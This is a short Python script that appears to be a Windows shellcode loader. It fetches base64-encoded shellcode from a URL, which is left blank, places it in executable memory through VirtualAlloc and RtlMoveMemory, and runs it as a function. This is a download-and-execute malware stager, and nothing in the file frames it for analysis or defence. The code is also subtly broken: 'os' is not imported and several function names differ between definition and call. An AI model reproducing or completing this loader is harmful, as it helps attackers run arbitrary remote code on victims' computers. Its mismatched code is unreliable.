#===========================#
# I M P O R T S             #
#===========================#

from urllib import request
import base64
import ctypes

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    BACKGROUND_MAGENTA = '\033[105m'
    BACKGROUND_WHITE = '\033[47m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    ORANGE = '\033[38;5;208m'

os.system("color")

#===========================#

kernel32 = ctypes.windll.kernel32

#===========================#

def getCode(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

#===========================#

def writeMemory(buf):
    length = len(buf)
    
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
    
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr
    
#===========================#

def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)
    
    ptr = write_memory(buffer)
    
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()
    
#===========================#

if __name__ == '__main__':
    url = ""
    shellcode = get_code(url)
    run(shellcode)